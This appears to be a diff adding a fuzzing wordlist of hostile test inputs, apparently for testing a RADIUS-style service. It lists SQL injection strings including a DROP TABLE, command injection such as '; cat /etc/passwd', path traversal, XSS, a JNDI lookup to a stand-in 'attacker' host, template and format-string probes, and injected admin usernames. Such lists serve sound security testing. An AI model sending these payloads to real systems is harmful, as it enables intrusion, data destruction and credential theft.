@@ -1,0 +1,70 @@
+'
+"
+`
+;
+--
+'--
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+1' AND '1'='1
+1' AND SLEEP(5)--
+1); DROP TABLE users;--
+UNION SELECT NULL--
+$(id)
+`id`
+|id
+||id
+&&id
+; id
+; cat /etc/passwd
+../../../../etc/passwd
+..\..\..\..\windows\win32\win.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+javascript:alert(1)
+%00
+\x00
+%0d%0a
+\r\n
+${jndi:ldap://attacker/a}
+{{7*7}}
+${7*7}
+#{7*7}
+%n%n%n%n
+%s%s%s%s
+%x%x%x%x
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0000000000000000000000000000000000000000000000000000000000000000000000000000
+-1
+0
+-9999999999
+99999999999999999999999
+NaN
+Infinity
+true
+false
+null
+None
+\0
+%
+%%
++
+++
+<>
+[]
+{}
+()
+../
+..\
+//
+\\
+%c0%af
+\u0000
+￿
+radsectest01\x00admin
+radsectest01\nUser-Name: admin
+radsectest01,admin
+radsectest01 OR user=admin
